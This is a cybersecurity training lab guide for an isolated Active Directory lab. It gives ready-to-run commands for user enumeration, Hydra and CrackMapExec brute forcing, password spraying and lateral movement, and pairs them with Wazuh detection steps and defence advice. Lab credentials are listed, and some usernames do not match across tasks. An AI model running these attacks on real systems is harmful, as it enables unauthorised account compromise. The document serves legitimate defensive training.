# Lab 07: User Account Enumeration and Weak Password Exploitation

## Objective

Learn to enumerate Active Directory user accounts and exploit weak passwords in a controlled lab environment. This lab demonstrates common reconnaissance and initial access techniques used by attackers.

## Prerequisites

- Domain Controller configured and running
- Lab user accounts created (see [LAB_USER_ACCOUNTS.md](../docs/LAB_USER_ACCOUNTS.md))
- Wazuh SIEM monitoring (optional but recommended)
- Kali Linux or attack machine configured
- Domain administrator credentials

## ⚠️ Important Security Notice

This lab is for **educational purposes only** in a controlled, isolated environment. Never perform these activities on production systems or networks without explicit authorization.

## Lab Tasks

### Task 1: Enumerate Active Directory Users

**Objective:** Discover user accounts in the domain using various enumeration techniques.

#### Method 1: Using PowerShell (From Domain-Joined Machine)

**Steps:**

1. **On CLIENT01 (or any domain-joined machine):**
   ```powershell
   # Enumerate all users
   Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled, DistinguishedName
   
   # Enumerate users by department
   Get-ADUser -Filter * -SearchBase "OU=Sales Department,OU=Users,DC=goldshire,DC=local" | Select-Object Name, SamAccountName
   
   # Enumerate disabled accounts
   Get-ADUser -Filter {Enabled -eq $false} | Select-Object Name, SamAccountName, Enabled
   
   # Enumerate service accounts
   Get-ADUser -Filter * -SearchBase "OU=Service Accounts,OU=Users,DC=goldshire,DC=local" | Select-Object Name, SamAccountName
   ```

2. **Document discovered users:**
   - List all usernames
   - Note disabled accounts
   - Identify service accounts
   - Identify high-privilege accounts (Domain Admins)

**Expected Result:** List of all user accounts in the domain.

#### Method 2: Using LDAP Queries (From Kali Linux)

**Steps:**

1. **On Kali Linux:**
   ```bash
   # Install ldapsearch if not available
   sudo apt-get update && sudo apt-get install -y ldap-utils
   
   # Query LDAP for users (anonymous bind)
   ldapsearch -x -H ldap://192.168.100.10 -b "DC=goldshire,DC=local" "(objectClass=user)" sAMAccountName
   
   # Query specific OU
   ldapsearch -x -H ldap://192.168.100.10 -b "OU=Sales Department,OU=Users,DC=goldshire,DC=local" "(objectClass=user)" sAMAccountName
   ```

2. **Using enum4linux (if available):**
   ```bash
   enum4linux -U 192.168.100.10
   ```

**Expected Result:** User account enumeration via LDAP.

#### Method 3: Using RPC (From Kali Linux)

**Steps:**

1. **On Kali Linux:**
   ```bash
   # Using rpcclient
   rpcclient -U "" -N 192.168.100.10
   > enumdomusers
   > enumdomgroups
   > exit
   ```

**Expected Result:** User enumeration via RPC.

### Task 2: Identify Weak Passwords

**Objective:** Identify accounts with weak passwords from the user list.

**Steps:**

1. **Review user account list:**
   - See [LAB_USER_ACCOUNTS.md](../docs/LAB_USER_ACCOUNTS.md) for all accounts
   - Identify accounts with weak passwords:
     - `sales1` - password: `password`
     - `sales2` - password: `12345678`
     - `hr1` - password: `hr2024`
     - `compromised_user` - password: `P@ssw0rd`

2. **Create password list:**
   - Extract weak passwords from documentation
   - Create wordlist file: `weak_passwords.txt`
   - Include common passwords and patterns

### Task 3: Brute Force Attack Simulation

**Objective:** Simulate brute force attacks against weak password accounts.

#### Method 1: Using Hydra

**Steps:**

1. **On Kali Linux:**
   ```bash
   # Create user list
   echo "gazlowe" > users.txt
   echo "tradewind" >> users.txt
   echo "turalyon" >> users.txt
   
   # Create password list
   echo "password" > passwords.txt
   echo "12345678" >> passwords.txt
   echo "hr2024" >> passwords.txt
   echo "P@ssw0rd" >> passwords.txt
   
   # Brute force SMB (Windows file sharing)
   hydra -L users.txt -P passwords.txt 192.168.100.10 smb
   
   # Brute force RDP (Remote Desktop)
   hydra -L users.txt -P passwords.txt 192.168.100.10 rdp
   ```

2. **Document results:**
   - Which accounts were compromised
   - Which passwords were cracked
   - Time taken for successful attacks

**Expected Result:** Successful authentication to accounts with weak passwords.

#### Method 2: Using CrackMapExec

**Steps:**

1. **On Kali Linux:**
   ```bash
   # Install CrackMapExec (if not available)
   # pip3 install crackmapexec
   
   # Brute force SMB
   crackmapexec smb 192.168.100.10 -u users.txt -p passwords.txt
   
   # Brute force with specific user
   crackmapexec smb 192.168.100.10 -u gazlowe -p password
   ```

**Expected Result:** Successful authentication and command execution.

### Task 4: Password Spraying Attack

**Objective:** Test common passwords against multiple accounts.

**Steps:**

1. **On Kali Linux:**
   ```bash
   # Create list of all users
   echo "gazlowe" > all_users.txt
   echo "tradewind" >> all_users.txt
   echo "gallywix" >> all_users.txt
   echo "turalyon" >> all_users.txt
   echo "jaina" >> all_users.txt
   echo "gelbin" >> all_users.txt
   echo "tinkmaster" >> all_users.txt
   
   # Common passwords to spray
   echo "Password123!" > common_passwords.txt
   echo "Welcome2024!" >> common_passwords.txt
   echo "password" >> common_passwords.txt
   echo "12345678" >> common_passwords.txt
   
   # Password spray attack
   crackmapexec smb 192.168.100.10 -u all_users.txt -p common_passwords.txt --continue-on-success
   ```

2. **Document results:**
   - Which accounts were compromised
   - Common password patterns discovered

**Expected Result:** Multiple accounts compromised with common passwords.

### Task 5: Monitor Attack in Wazuh

**Objective:** Observe how SIEM detects brute force and enumeration attacks.

**Steps:**

1. **In Wazuh Dashboard:**
   - Navigate to Security Events
   - Filter for failed login attempts
   - Look for brute force patterns
   - Check for account lockout events

2. **On DC01 - Event Viewer:**
   - Open **Event Viewer > Windows Logs > Security**
   - Filter for Event ID 4625 (Failed logon)
   - Review failed authentication attempts
   - Check for Event ID 4740 (Account lockout)

3. **Document findings:**
   - Number of failed login attempts
   - Accounts targeted
   - Detection capabilities
   - Response time

**Expected Result:** Security events logged and detected in SIEM.

### Task 6: Lateral Movement from Compromised Account

**Objective:** Use compromised account to enumerate and move laterally.

**Steps:**

1. **Authenticate with compromised account:**
   ```bash
   # Using CrackMapExec with compromised credentials
   crackmapexec smb 192.168.100.10 -u gazlowe -p password
   
   # Enumerate shares
   crackmapexec smb 192.168.100.10 -u gazlowe -p password --shares
   
   # Enumerate logged on users
   crackmapexec smb 192.168.100.10 -u gazlowe -p password --loggedon-users
   ```

2. **Attempt lateral movement:**
   - Try to access other systems
   - Enumerate domain information
   - Attempt privilege escalation

**Expected Result:** Lateral movement capabilities demonstrated.

## Expected Results

- Successfully enumerated all user accounts
- Identified accounts with weak passwords
- Successfully brute forced weak password accounts
- Detected attacks in Wazuh SIEM
- Demonstrated lateral movement from compromised account

## Key Learnings

1. **User Enumeration:**
   - Multiple methods available (PowerShell, LDAP, RPC)
   - Domain-joined machines have better access
   - Anonymous enumeration may be possible

2. **Weak Passwords:**
   - Common passwords are easily cracked
   - Password patterns are predictable
   - Service accounts often have weak passwords

3. **Attack Detection:**
   - SIEM can detect brute force patterns
   - Event logs capture failed attempts
   - Account lockouts provide detection

4. **Defense Recommendations:**
   - Implement strong password policies
   - Enable account lockout policies
   - Monitor for enumeration attempts
   - Use multi-factor authentication
   - Regular password audits

## Cleanup

After completing the lab:

1. **Reset account lockouts:**
   ```powershell
   # On DC01
   Unlock-ADAccount -Identity gazlowe
   Unlock-ADAccount -Identity tradewind
   ```

2. **Review and clear event logs** (optional)

3. **Document lessons learned**

## Additional Resources

- [LAB_USER_ACCOUNTS.md](../docs/LAB_USER_ACCOUNTS.md) - Complete user account reference
- [Microsoft Security Event IDs](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-security-events)
- OWASP - Password Storage Cheat Sheet

## Next Steps

- **Lab 05:** Attack Simulation - More advanced attack scenarios
- **Lab 06:** Incident Response - Investigate and respond to compromises

